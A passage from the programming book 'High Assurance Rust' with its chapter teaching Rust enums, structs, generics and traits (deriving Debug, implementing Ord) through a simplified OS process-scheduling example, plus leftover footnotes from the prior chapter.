<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a> <a href="#fr-MISRA_2012-2">↩2</a> <a href="#fr-MISRA_2012-3">↩3</a> <a href="#fr-MISRA_2012-4">↩4</a></p>
</li>
<li id="footnote-IndexAside">
<p>Well, that's true in the case of a <code>Vec</code>. Under-the-hood <code>Vec</code> is a <em>fat pointer</em> (memory address, length, and capacity) to an array allocated on the heap. Indexing <code>my_vec[i]</code> involves computing an offset to a memory location. But for custom containers you define, overloading the index operator can perform any operation that makes logical sense in the context of your container. We'll implement our own indexing logic for ordered maps and sets later in the book. <a href="#fr-IndexAside-1">↩</a></p>
</li>
<li id="footnote-TraitFrom">
<p><a href="https://doc.rust-lang.org/std/convert/trait.From.html"><em>Trait <code>std::convert::From</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitFrom-1">↩</a></p>
</li>
<li id="footnote-TraitInto">
<p><a href="https://doc.rust-lang.org/std/convert/trait.Into.html"><em>Trait <code>std::convert::Into</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-TraitInto-1">↩</a></p>
</li>
<li id="footnote-TypeInference">
<p><a href="https://rustc-dev-guide.rust-lang.org/type-inference.html#type-inference"><em>Type inference</em></a>. Guide to Rustc Development (Accessed 2022). Rust uses an extension of the Hindley-Milner type inference algorithm<sup class="footnote-reference" id="fr-HMT-1"><a href="#footnote-HMT">9</a></sup>. <a href="#fr-TypeInference-1">↩</a></p>
</li>
<li id="footnote-Triangle">
<p><a href="https://www.mathopenref.com/triangle306090.html"><em>30° - 60°- 90° Triangle</em></a>. Math Open Reference (Accessed 2022). <a href="#fr-Triangle-1">↩</a></p>
</li>
<li id="footnote-TRPL">
<p><a href="https://doc.rust-lang.org/book/ch08-02-strings.html"><em>Storing UTF-8 Encoded Text with Strings</em></a>. by Steve Klabnik, Carol Nichols (Accessed 2022). <a href="#fr-TRPL-1">↩</a></p>
</li>
<li id="footnote-HMT">
<p><a href="https://en.wikipedia.org/wiki/Hindley%E2%80%93Milner_type_system"><em>Hindley–Milner type system</em></a>. Wikipedia (Accessed 2022). <a href="#fr-HMT-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-high-level-data-2-of-6"><a class="header" href="#rust-high-level-data-2-of-6">Rust: High-Level Data (2 of 6)</a></h1>
<p>We saw low-level fundamentals in the last section.
They're important and common.
But where Rust really starts to shine is the higher-level constructs: "custom" data types that map more closely to our problem domain.</p>
<p>Rust draws influence from functional languages like ML, OCaml, and Haskell - among others<sup class="footnote-reference" id="fr-RustInfluence-1"><a href="#footnote-RustInfluence">1</a></sup>.
It brings to the table some interesting, perhaps even exotic, constructs.
Features we don't often see in performant systems languages.</p>
<p>We'll ease our way into some of these constructs in this section, assuming no prior familiarity with functional languages.</p>
<h2 id="enums"><a class="header" href="#enums">Enums</a></h2>
<p>Enumerations, "enums" for short, let you define a type whose possible values are a set of named constants.
In their most basic usage, Rust enums are similar to enums present in most other languages.</p>
<p>We're going to be using a running example for the next handful of sections - that of an Operating System (OS) capable of running several processes (in-memory, isolated instances of programs).
To show how constructs of Rust code can map to a specific domain<sup class="footnote-reference" id="fr-TockOS-1"><a href="#footnote-TockOS">2</a></sup>.
And to learn or review a few OS concepts along the way.</p>
<p>Let's assume a process can, at any given time, be in one of three states:</p>
<ol>
<li>
<p><strong>Running</strong> - Currently executing on a CPU core.</p>
</li>
<li>
<p><strong>Stopped</strong> - Suspended indefinitely (perhaps the user pressed <code>Ctrl+Z</code>).</p>
</li>
<li>
<p><strong>Sleeping</strong> - Suspended temporarily (perhaps it's waiting for data, like user input, to become available).</p>
</li>
</ol>
<p>Enums are a natural way to express mutually exclusive but related possibilities.
We can declare a <code>State</code> enum with three <em>variants</em> (named constants <code>Running</code>, <code>Stopped</code>, and <code>Sleeping</code>):</p>
<pre><code class="language-rust noplaypen">pub enum State {
    Running,
    Stopped,
    Sleeping,
}</code></pre>
<p>An OS needs to take different actions depending on what state a process is currently in.
For example, when an internal timer goes off (e.g. an "interrupt fires"), it may be time to stop a currently running process, save its state, and run/restore a different process.
CPU time is a shared resource, processes need to take turns.</p>
<p>Rust supports <em>pattern matching</em> as a means to conditionally decide which logic should be executed.
One common use is matching on the variant of an enum.
For example, the OS could execute a different function depending on the state of a process:</p>
<pre><code class="language-rust ignore">fn manage_process(curr_state: State) {
    match curr_state {
        State::Running =&gt; stop_and_schedule_another_process(),
        State::Stopped =&gt; assign_to_available_cpu_core(),
        State::Sleeping =&gt; check_if_data_ready_and_wake_if_so(),
    }
}</code></pre>
<p>Each line inside the <code>match</code> brackets is called an <em>arm</em>.
The <em>pattern</em> is to the left of the arrow operator (<code>=&gt;</code>) and the code executed if the pattern <em>matches</em> is to the right.
We'll discuss pattern matching in more detail in the next section, which covers control flow.</p>
<p>What differentiates Rust enums from those of C, C++, and many other languages is their ability to encapsulate additional data of varying types.
This ability makes Rust enums akin to "sum types" in functional languages (which are a specific kind of "algebraic data type").
In practice, what that means is we have the flexibility to store arbitrary data in each variant.
That data could even be another enum!</p>
<p>Let's say we had design requirements for a more granular process state representation.
Specifically, say an OS needs to:</p>
<ul>
<li>
<p>Track two kinds of stop requests: those that can be ignored by the process and those that can't.</p>
</li>
<li>
<p>Record a start timestamp for sleeping processes, to later calculate how long a sleeping process has been inactive.</p>
</li>
</ul>
<p>We could replace our <code>State</code> enum with a <code>DetailedState</code> that reflects the new requirements:</p>
<pre><code class="language-rust noplaypen">#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum StopKind {
    Mandatory, // Linux SIGSTOP
    Ignorable, // Linux SIGTSTP
}

pub enum DetailedState {
    Running,
    Stopped { reason: StopKind },
    Sleeping { start_time: u64 },
}</code></pre>
<p>Notice how the <code>Stopped</code> variant now contains another enum (<code>StopKind</code> - ignore the <code>#[derive(...</code> above it for now) and the <code>Sleeping</code> variant now contains a <code>u64</code> timestamp (akin to UNIX's epoch representation<sup class="footnote-reference" id="fr-Epoch-1"><a href="#footnote-Epoch">3</a></sup>).
Yet the <code>Running</code> variant remains empty.</p>
<p>We can freely choose data types encapsulated within variants and can still "pull out" the inner type when matching.
The below snippet is a test where the first arm checks the <code>Stopped</code> variant's inner data.
The second arm uses a wildcard (<code>_</code>) to assert that this test won't match against any other variants (since <code>state</code> is hardcoded).</p>
<pre><code class="language-rust ignore">#[test]
fn test_detailed_stop_match() {
    let state = DetailedState::Stopped {
        reason: StopKind::Mandatory,
    };
    match state {
        DetailedState::Stopped { reason } =&gt; {
            assert_eq!(reason, StopKind::Mandatory);
        }
        _ =&gt; unreachable!(), // Will panic at runtime if reached
    }
}</code></pre>
<p>One devilish detail: the in-memory size of an enum is determined by its largest variant.
An instance of the <code>Running</code> variant is the same size as an instance of <code>Sleeping</code> variant, despite the latter holding more information.
Memory layout isn't something you'll need to think about often, but it's worth noting.
We may be using fancy sum types, but we're still writing low-level code.</p>
<h2 id="structures"><a class="header" href="#structures">Structures</a></h2>
<p>Structures, specifically name-field structs like the below, are the primary way you'll represent data in most Rust programs.
Rust structs serve the same purpose as Python classes or Java objects - they're a way to group data and functions that operate on that data<sup class="footnote-reference" id="fr-EnumAside-1"><a href="#footnote-EnumAside">4</a></sup>.</p>
<p>One of main responsibilities of an OS kernel is <em>task scheduling</em> - deciding which process (or its threads) should be running on which CPU core and for how long.
Many programs are composed of multiple processes, a <em>parent process</em> can create one or more <em>child processes</em>.</p>
<p>If we were implementing an OS, we'd likely want to group process-relevant data into a struct.
A simplified example<sup class="footnote-reference" id="fr-LinuxTaskStruct-1"><a href="#footnote-LinuxTaskStruct">5</a></sup> could look like this:</p>
<pre><code class="language-rust ignore">pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    state: State,       // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}</code></pre>
<blockquote>
<p><strong>How do multiprocess programs work?</strong></p>
<p>One program (parent process) can start (e.g. "spawn") a second helper program (child process).
If the helper is doing independent work, they can both run <em>simultaneously</em> on a modern, multi-core system.
The parent runs on one core while the child runs on another.</p>
<p>That's what helps your web browser feel faster and more responsive.
By default, the Chromium runs one process per website connected to<sup class="footnote-reference" id="fr-ChromeProc-1"><a href="#footnote-ChromeProc">6</a></sup>.</p>
</blockquote>
<p>The <code>Proc</code> struct represents a concept from our problem domain (the idea of an OS-managed process) as typed data.
To make working with the data easier, we'd likely add methods (have <code>self</code> parameter) and associated functions (no <code>self</code> parameter) - just like we did with the <code>Rc4</code> struct in the last chapter.
Both types of functions must be defined within a struct's <code>impl</code> block.
For example:</p>
<pre><code class="language-rust ignore">impl Proc {
    /// Associated function (constructor)
    pub fn new(pid: u32) -&gt; Self {
        Proc {
            pid,
            state: State::Stopped,
            children: Vec::new()
        }
    }

    /// Method (takes self, mutable setter in this case)
    pub fn set_state(&amp;mut self, new_state: State) {
        self.state = new_state;
    }

    // ...more methods/functions here
}</code></pre>
<p>Note that named fields (<code>pid</code>, <code>state</code>, and <code>children</code>) are private by default.
They can only be accessed by code in the <em>module</em> in which the struct is defined.
Modules are a way to group related code, think of them as Rust's version of namespaces.</p>
<p>If this code were in another module that imported <code>Proc</code>, it would not compile because the private field <code>state</code> cannot be assigned to:</p>
<pre><code class="language-rust ignore">use my_os_module::Proc;

let mut my_proc = Proc::new(0);
my_proc.state = State::Running;</code></pre>
<p>That's why we defined a setter method, the below would work:</p>
<pre><code class="language-rust ignore">use my_os_module::Proc;

let mut my_proc = Proc::new(0);
my_proc.set_state(State::Running);</code></pre>
<p>This manner of <em>data encapsulation</em><sup class="footnote-reference" id="fr-DataEncap-1"><a href="#footnote-DataEncap">7</a></sup> is considered a best practice for public APIs.
But it's not required, nor is it always appropriate.
If we wanted <code>state</code> to be writable by external code (e.g. <code>my_proc.state = State::Running;</code> to work), we could use the <code>pub</code> visibility specifier at declaration:</p>
<pre><code class="language-rust ignore">pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    pub state: State,   // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}</code></pre>
<p>We'll discuss modules and visibility later in this chapter.</p>
<p>Notice how Rust takes a conservative approach: external visibility, mutability, and unsafety all require explicit opt-in.
This is a conscious design choice that helps reduce potential sources of error in large programs.</p>
<h2 id="generics"><a class="header" href="#generics">Generics</a></h2>
<p>We've already used a generic library: standard's <code>Vec</code>.
It's defined as <code>Vec&lt;T&gt;</code>, where <code>T</code> is a generic type.
That's why we can have both a vector of unsigned integers (<code>Vec&lt;usize&gt;</code>) and a vector of strings (<code>Vec&lt;String&gt;</code>), without needing to use a different library API for each type of item we want to store.</p>
<p>Imagine that instead of writing a single hobby OS for yourself, you're actually writing a reusable scheduling library - code that can potentially be leveraged by anyone writing an OS.
This is where <em>generics</em> would come in.
Instead of creating a specific instance of a structure or function, you can define a <em>template</em> that users of your code can plug <em>types</em> into.
Including custom types defined in by external code written in the future!</p>
<p>Maybe some of your users are writing an OS for tiny embedded devices that will never have more than 100 processes running simultaneously.
They need to save precious memory by using a <code>u8</code> to represent <code>pid</code>, instead of a <code>u32</code>.
But we can't just change <code>pid</code>'s type to a <code>u8</code> - other users need to represent thousands of processes.
Updating <code>Proc</code>'s definition and implementation to be generic lets us accommodate both groups:</p>
<pre><code class="language-rust ignore">pub struct Proc&lt;T&gt; {
    pid: T,             // Process ID (generic)
    pub state: State,   // Current state (enum)
    children: Vec&lt;T&gt;,   // Child IDs (dynamic list, generic)
}

impl&lt;T&gt; Proc&lt;T&gt; {
    // Associated function (constructor)
    pub fn new(pid: T) -&gt; Self {
        Proc {
            pid,
            state: State::Stopped,
            children: Vec::new()
        }
    }

    // ...more methods/functions here
}</code></pre>
<p>The resource-constrained users can specify <code>let mut my_proc: Proc&lt;u8&gt; = Proc::new(0);</code>, others can use <code>let mut my_proc: Proc&lt;u32&gt; = Proc::new(0);</code>.
Our code becomes flexible enough to work for either.</p>
<blockquote>
<p><strong>How do generics work in the final binary?</strong></p>
<p>The Rust compiler implements generics via <em>monomorphization</em>.
For each concrete type (like <code>u8</code>) used at any callsite, the compiler generates specialized code in the output binary.
So generics have no runtime cost - each unique <code>T</code> "template" creates one "stamp" (unique code) in the final executable.</p>
</blockquote>
<p>Generics are a core feature of Rust, you'll see them often.
Coupled with traits, they enable the creation of reusable, maintainable software components.</p>
<h2 id="traits"><a class="header" href="#traits">Traits</a></h2>
<p>The constructs we've discussed thus far haven't been that drastic a departure from the mainstream.
Rust's enums and pattern matching likely feel like an extension of language features you're already familiar with.
Traits are where, for many readers, Rust will start to feel significantly different.</p>
<p>We previously said that Rust structs fill the same role as Python classes and Java objects.
But unlike both of those languages, Rust doesn't support <em>inheritance</em>.
There are no class hierarchies, a struct can't inherit fields or methods from a parent.</p>
<p>Instead, shared behavior is defined by <em>composition</em>, via <em>traits</em>.
Some consider this approach a best practice, even in object-oriented languages<sup class="footnote-reference" id="fr-Composition-1"><a href="#footnote-Composition">8</a></sup>.</p>
<p>In terms of code-level mechanics, a trait is akin to an "abstract base class" in an object-oriented language.
Meaning it defines an interface (set of APIs) that any type implementing the trait must support.</p>
<p>Types can implement one or more traits, and doing so allows the type to be used in any context in which that trait is appropriate.</p>
<blockquote>
<p><strong>What is inheritance, again?</strong></p>
<p>Inheritance, a kind of "subtype polymorphism", allows us to perform limited substitution of two types.</p>
<p>Say a <code>Vehicle</code> class has the method <code>accelerate(int speed_mph)</code> and both <code>Car</code> and <code>Plane</code> subclasses inherit it.
We want to write code that processes an array of <code>Vehicle</code> derivatives, calling <code>accelerate</code> on both <code>Car</code>s and <code>Plane</code>s.
There's two ways for inheritance to achieve that goal, most languages offer both:</p>
<ul>
<li>
<p><strong>Interface Inheritance:</strong> <code>Car</code> and <code>Plane</code> share the public method interface of <code>Vehicle</code> but override the actual <code>accelerate</code> implementation with their respective customizations. Here, <code>Vehicle</code> acts as an "abstract base class". Rust's traits embody this best practice.</p>
</li>
<li>
<p><strong>Implementation Inheritance:</strong> <code>Car</code> and <code>Plane</code> share the data and implementation of <code>Vehicle</code>'s generic <code>accelerate</code> method. This pattern is widely used in real-world programs, but the tight coupling of base and derived classes can make code more difficult to maintain and extend.</p>
</li>
</ul>
</blockquote>
<p>So what kind of behavior can traits specify?
And how do we make use of them?
We'll add two traits to our <code>Proc</code> struct to find out.</p>
<h3 id="deriving-trait-debug"><a class="header" href="#deriving-trait-debug">Deriving Trait <code>Debug</code></a></h3>
<p>Being able to print out a text representation of a struct is useful for debugging.
In fact, it's a need so common that Rust provides a default format specifier specifically for this purpose: <code>{:?}</code>.
Let's try using it to print the original, non-generic <code>Proc</code> struct:</p>
<pre><code class="language-rust ignore">pub enum State {
    Running,
    Stopped,
    Sleeping,
}

pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    state: State,       // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}

fn main() {
    let my_proc = Proc {
        pid: 1,
        state: State::Stopped,
        children: Vec::new(),
    };

    println!("{:?}", my_proc);
}</code></pre>
<p>We get this error (some lines omitted):</p>
<pre><code class="language-ignore">error[E0277]: `Proc` doesn't implement `Debug`
  --&gt; src/main.rs:20:22
   |
20 |     println!("{:?}", my_proc);
   |                      ^^^^^^^ `Proc` cannot be formatted using `{:?}`
   |
   = help: the trait `Debug` is not implemented for `Proc`
   = note: add `#[derive(Debug)]` to `Proc` or manually `impl Debug for Proc`
</code></pre>
<p>If we want to use <code>{:?}</code>, compiler needs <code>Proc</code> to implement the <code>Debug</code> trait<sup class="footnote-reference" id="fr-TraitDebug-1"><a href="#footnote-TraitDebug">9</a></sup>.
This trait defines how its implementor should be printed to the console, a common and desirable <em>behavior</em>.
At this point we have two options:</p>
<ol>
<li>
<p>Review the documentation<sup class="footnote-reference" id="fr-TraitDebug-2"><a href="#footnote-TraitDebug">9</a></sup> for <code>std::fmt::Debug</code> to understand the interface it requires (in this case it's only one function) and implement the interface within a <code>impl Debug for Proc { ... }</code> block.</p>
</li>
<li>
<p>Attempt to <em>derive</em> the trait automatically, with the derive macro <code>#[derive(Debug)]</code>.</p>
</li>
</ol>
<p>The latter option is easier, and is the route recommended by the documentation<sup class="footnote-reference" id="fr-TraitDebug-3"><a href="#footnote-TraitDebug">9</a></sup>.</p>
<blockquote>
<p><strong>Getting familiar with Rust documentation</strong></p>
<p>If you haven't done so already, take a second to review the documentation for the <code>Debug</code> trait<sup class="footnote-reference" id="fr-TraitDebug-4"><a href="#footnote-TraitDebug">9</a></sup> now.
Although you won't understand the entirety of the function signature yet, you can still get a sense of the broad strokes.</p>
<p>Understanding library documentation is a key skill for any developer, but it's especially useful for Rust programming.
Popular libraries tend to be well-documented because Rust has a built-in, 1st party document generator (which we'll cover soon!).</p>
</blockquote>
<p>Let's make the suggested update:</p>
<pre><code class="language-rust ignore">#[derive(Debug)]
pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    state: State,       // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}</code></pre>
<p>We now get a new error (aka a programmer's definition of "progress"):</p>
<pre><code class="language-ignore">error[E0277]: `State` doesn't implement `Debug`
  --&gt; src/main.rs:10:5
   |
7  | #[derive(Debug)]
   |          ----- in this derive macro expansion
...
10 |     state: State,       // Current state (enum)
   |     ^^^^^^^^^^^^ `State` cannot be formatted using `{:?}`
   |
   = help: the trait `Debug` is not implemented for `State`
   = note: add `#[derive(Debug)]` to `State` or manually `impl Debug for State`
</code></pre>
<p>Well, not entirely new. It's the same error as before, but this time for the <code>state</code> <em>field</em> of <code>Proc</code>.
Remember the idea of defining behavior by <em>composition</em>?</p>
<p>If every individual field of a struct implements the <code>Debug</code> trait, then deriving it for the entire struct is trivial - the behavior is simply a composite of the individual behaviors of each field.
We can build up powerful abstractions and reuse existing code, without the need to fit everything into a strict hierarchy.</p>
<p>Per this second error, our only remaining blocker is that the <code>State</code> type doesn't implement <code>Debug</code>.
Let's correct that:</p>
<pre><code class="language-rust noplaypen">#[derive(Debug)]
pub enum State {
    Running,
    Stopped,
    Sleeping,
}</code></pre>
<p>The program will now compile and run.
We get the desired print output:</p>
<pre><code class="language-ignore">Proc { pid: 1, state: Stopped, children: [] }
</code></pre>
<blockquote>
<p><strong>Quick Tip for <code>Debug</code> Printing</strong></p>
<p>For debugging systems code, it's often useful to print structs with hexadecimal numerical values and one field per line.
If we update the last line of <code>main</code> to <code>println!("{:#x?}", my_proc);</code>, the program prints:</p>
<pre><code class="language-ignore">Proc {
  pid: 0x1,
  state: Stopped,
  children: [],
}
</code></pre>
</blockquote>
<h3 id="implementing-trait-ord"><a class="header" href="#implementing-trait-ord">Implementing Trait <code>Ord</code></a></h3>
<p>Sometimes a trait can't be derived automatically.
Take, for example, the <code>Aead</code> trait<sup class="footnote-reference" id="fr-TraitAead-1"><a href="#footnote-TraitAead">10</a></sup>.
It's defined in a 3rd party library and specifies an [unofficial] interface for Authenticated Encryption with Associated Data (AEAD) ciphers.
Recall from the previous chapter that this is a family of cryptographic algorithms providing both message <em>confidentiality</em> and <em>integrity</em><sup class="footnote-reference" id="fr-AEAD-1"><a href="#footnote-AEAD">11</a></sup>.</p>
<p>Rust's trait system is powerful, but a derive macro isn't going to synthesize cryptographic code for us.
Traits are just interfaces, and we often need to implement the backing logic ourselves.</p>
<p>Moreover, even if a trait is derivable, the default behavior may not be what we want.
Say an OS needs to maintain a sorted list of process structures.
Sorting requires a notion of "order".
What mathematicians call "total order"<sup class="footnote-reference" id="fr-TotalOrder-1"><a href="#footnote-TotalOrder">12</a></sup>.
The underlying idea is that we want to use logical comparison operators (<code>==</code>, <code>&gt;</code>, <code>&lt;=</code>, etc) to sort, and we must be able to make these comparisons unambiguously.</p>
<p>Rust's standard library includes a trait specifically for ordering: <code>Ord</code><sup class="footnote-reference" id="fr-Ord-1"><a href="#footnote-Ord">13</a></sup>.
Any type that implements it becomes comparable to items of the same type, and collections of it can be sorted.
In many contexts, that's an incredibly useful behavior to support.</p>
<p>Can we derive <code>Ord</code> for <code>Proc</code>?
Yes.
But, per the documentation<sup class="footnote-reference" id="fr-Ord-2"><a href="#footnote-Ord">13</a></sup>, <code>Ord</code> depends on other traits: <code>PartialEq</code>, <code>Eq</code>, <code>PartialOrd</code>.
Because traits themselves can be defined by composition!</p>
<p>Let's not split hairs with the distinctions between these four order-related traits.
Instead consider what happens if we derive them:</p>
<pre><pre class="playground"><code class="language-rust">#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum State {
    Running,
    Stopped,
    Sleeping,
}

#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    state: State,       // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}

fn main() {
    let my_proc_stopped = Proc {
        pid: 1,
        state: State::Stopped,
        children: Vec::new(),
    };

    let my_proc_sleeping = Proc {
        pid: 3,
        state: State::Sleeping,
        children: Vec::new(),
    };

    let my_proc_running = Proc {
        pid: 2,
        state: State::Running,
        children: Vec::new(),
    };

    let mut proc_queue = vec![
        my_proc_stopped,
        my_proc_sleeping,
        my_proc_running,
    ];

    proc_queue.sort();

    println!("{:#?}", proc_queue);
}</code></pre></pre>
<p>The above creates a <code>Vec</code> of three processes (<code>proc_queue</code>) and sorts it.
Why is calling <code>proc_queue.sort()</code> possible?
Consider the function signature for <code>sort</code> from <code>Vec&lt;T&gt;</code>'s documentation<sup class="footnote-reference" id="fr-VecSort-1"><a href="#footnote-VecSort">14</a></sup>:</p>
<pre><code class="language-rust ignore">pub fn sort(&amp;mut self)
where
    T: Ord,
{
    // ...code here
}</code></pre>
<p><code>where T: Ord</code> is a <em>trait bound</em>.
It stipulates what behavior <code>T</code> needs to support for the function to work.
That means <code>sort</code> is available on any <code>Vec&lt;T&gt;</code>, but <em>only if</em> <code>T</code> is a type implementing <code>Ord</code>.
The above code works because:</p>
<ol>
<li>
<p>Type inference filled in <code>let mut proc_queue: Vec&lt;Proc&gt; = ...</code>.</p>
</li>
<li>
<p>The <code>Proc</code> struct derived the <code>Ord</code> trait.</p>
</li>
</ol>
<p>Trait bounds major ramifications for code reuse and library composability.
<code>Vec</code> is a generic container (will work even for types that haven't been invented yet) and offers additional functionality for items that support specific behaviors (like sorting types that can be ordered).</p>
<p>But <code>Vec</code> isn't some one-off that only the official standard library can implement.
Any Rust developer can similarly use generics and traits to implement equally useful data structures.
We'll write an API-compatible alternative to another standard library collection in this book.</p>
<p>Trait bounds enable you to rapidly and confidently compose disparate components into large, harmonious systems.
They're a powerful high-level construct.</p>
<blockquote>
<p><strong>Reading Rust Syntax</strong></p>
<p>It'll take time to get comfortable reading Rust, the syntax is complex.
The <code>where</code> keyword is actually a readability convenience, the above <code>sort</code> signature is equivalent to:</p>
<pre><code class="language-rust ignore">pub fn sort&lt;T: Ord&gt;(&amp;mut self) {
   // ...code here
}</code></pre>
<p>But where did <code>T</code> come from?
Neither <code>sort</code> variation is a stand-alone function, both exist within the <code>impl</code> block for <code>Vec&lt;T&gt;</code>.
We omitted that detail for brevity, but it's consequential:</p>
<pre><code class="language-rust ignore">impl&lt;T&gt; Vec&lt;T&gt; {
  pub fn sort&lt;T: Ord&gt;(&amp;mut self) {
      // ...code here
  }

  // ...other functions here
}</code></pre>
</blockquote>
<p>So, due to trait bounds, the call to <code>sort()</code> works.
But does it work <em>well</em>?
That's debatable, the output shows we've sorted by <code>pid</code>:</p>
<pre><code class="language-ignore">[
    Proc {
        pid: 1,
        state: Stopped,
        children: [],
    },
    Proc {
        pid: 2,
        state: Running,
        children: [],
    },
    Proc {
        pid: 3,
        state: Sleeping,
        children: [],
    },
]
</code></pre>
<p>The derived composite behavior will attempt to sort by the 1st field of the struct (<code>pid</code>).
If the values happen to be equal, it will sort by the 2nd field (<code>state</code>, which also derives <code>Ord</code>).
If those values happen to be equal, then it will sort by the 3rd field (<code>children</code>), etc.</p>
<p>This compiled and ran, but it isn't quite the behavior we want.
Imagine our OS uses this list of processes as a scheduling queue, to decide which process to run next.
We'd need to sort them via some notion of priority, not <code>pid</code>-first.</p>
<p>Real-world scheduling algorithms can be complex<sup class="footnote-reference" id="fr-SchedAlg-1"><a href="#footnote-SchedAlg">15</a></sup>.
For simplicity, let's assume we have three priorities based solely on the current <code>State</code>.
Any <code>Sleeping</code> process should be the highest priority for execution, followed by <code>Stopped</code> processes.
<code>Running</code> processes are, by definition, already running - they're the lowest priority.
We want them at the back of the list.
It's time to implement <code>Ord</code> the hard way!</p>
<p>First, we need to understand a little more about how the <code>State</code> enum works under-the-hood.
In memory, each variant starts with a <em>discriminant</em> - an integer number.
It's like a tag unique to the variant.</p>
<p>Had two <code>pid</code>s been equal, we'd need to break the sorting tie by looking at <code>state</code>.
Thus this discriminant integer would have come into play for sorting.
Let's keep the derived <code>Ord</code> on <code>State</code> but overwrite the default values to reflect our chosen priorities:</p>
<pre><code class="language-rust noplaypen">#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum State {
    Running = 3,    // 0 by default
    Stopped = 2,    // 1 by default
    Sleeping = 1,   // 2 by default
}</code></pre>
<p>For the <code>Proc</code> struct, we'll now implement the actual functions required by the <code>Ord</code><sup class="footnote-reference" id="fr-TraitOrd-1"><a href="#footnote-TraitOrd">16</a></sup>, <code>PartialOrd</code><sup class="footnote-reference" id="fr-TraitPartialOrd-1"><a href="#footnote-TraitPartialOrd">17</a></sup>, and <code>PartialEq</code><sup class="footnote-reference" id="fr-TraitPartialEq-1"><a href="#footnote-TraitPartialEq">18</a></sup> traits - per the respective documentation.
We can still derive <code>Eq</code><sup class="footnote-reference" id="fr-TraitEq-1"><a href="#footnote-TraitEq">19</a></sup>, because it's implied by <code>PartialEq</code> and has no methods of its own (a technicality that doesn't generalize to other traits):</p>
<pre><code class="language-rust ignore">use std::cmp::Ordering;

#[derive(Debug, Eq)]
pub struct Proc {
    pid: u32,           // Process ID (unsigned integer)
    state: State,       // Current state (enum)
    children: Vec&lt;u32&gt;, // Child IDs (dynamic list)
}

impl Ord for Proc {
    fn cmp(&amp;self, other: &amp;Self) -&gt; Ordering {
        self.state.cmp(&amp;other.state)
    }
}

impl PartialOrd for Proc {
    fn partial_cmp(&amp;self, other: &amp;Self) -&gt; Option&lt;Ordering&gt; {
        Some(self.cmp(other))
    }
}

impl PartialEq for Proc {
    fn eq(&amp;self, other: &amp;Self) -&gt; bool {
        self.state == other.state
    }
}</code></pre>
<p>The details of the above code aren't as important as the implication: now the language, at a very fundamental level, will <em>only</em> consider the <code>state</code> field when ordering <code>Proc</code> structs.
By implementing a few specific traits, we've prescribed how the struct will <em>behave</em> in a range of contexts - like sorting and comparison.</p>
<p>With this new implementation of <code>Ord</code> and the traits it relies on, <code>println!("{:#?}", proc_queue);</code> will now output the <code>state</code>-prioritized order we desire:</p>
<pre><code class="language-ignore">[
    Proc {
        pid: 3,
        state: Sleeping,
        children: [],
    },
    Proc {
        pid: 1,
        state: Stopped,
        children: [],
    },
    Proc {
        pid: 2,
        state: Running,
        children: [],
    },
]
</code></pre>
<blockquote>
<p><strong>Be careful, traits are powerful!</strong></p>
<p>In implementing a trait manually, we've changed not only how <code>Proc</code> structs should be ordered for sorting but also what it means for two <code>Proc</code> structs to be equal!</p>
<p>Now, any two structs with the same <code>state</code> are considered logically equivalent as far as the <code>==</code> operator is concerned, even if they have different <code>pid</code>s and <code>children</code>.</p>
<p>Whenever you manually implement a trait, it's important to ensure all of the ramifications of that implementation are indeed appropriate for your program.</p>
<p>In this case, trait implementation is actually overkill (we did it just to illustrate important concepts).
Instead, we could've used <code>Vec</code>'s <code>sort_by_key</code> function<sup class="footnote-reference" id="fr-VecSortByKey-1"><a href="#footnote-VecSortByKey">20</a></sup> after updating the enum discriminants:</p>
<pre><code class="language-rust ignore">proc_queue.sort_by_key(|p| p.state);</code></pre>
</blockquote>
<h2 id="takeaway-8"><a class="header" href="#takeaway-8">Takeaway</a></h2>
<p>Rust's facilities for expressing high-level constructs include enums, structs, generics, and traits.
To recap:</p>
<ul>
<li>
<p>Enums are useful for representing a finite set of possible values, but may also carry additional data.</p>
</li>
<li>
<p>Structs are a way to group related data and functions that operate on it, akin to classes or objects in other languages.</p>
</li>
<li>
<p>Generics enable code reuse: functions and structures can be written only once yet support different types. While merely handy for avoiding code duplication, it's a truly killer feature for library design.</p>
</li>
<li>
<p>Traits enable shared behavior via composition. They define specific interfaces, can be derived or implemented, and become especially useful when <em>bound</em> to generic parameters.</p>
</li>
</ul>
<p>Let's take a breather to talk about a simpler topic, control flow, before we delve into ownership.</p>
<blockquote>
<p><strong>Can we encode domain-specific invariants directly into the type system?</strong></p>
<p>In a limited yet potent fashion, yes.
Sometimes important, domain-specific behavior can be modeled as a <em>state machine</em>.
A structure that transitions through a sequence of states, in which certain operations can only be performed in certain states.
And only certain transitions are legal.</p>
<p>The <em>typestate pattern</em> is a way of encoding a structure's possible <em>runtime</em> states at <em>compile-time</em>.
It can eliminate both state-related errors (static correctness) and the need for some runtime checks (performance). The former benefit is amenable to:</p>
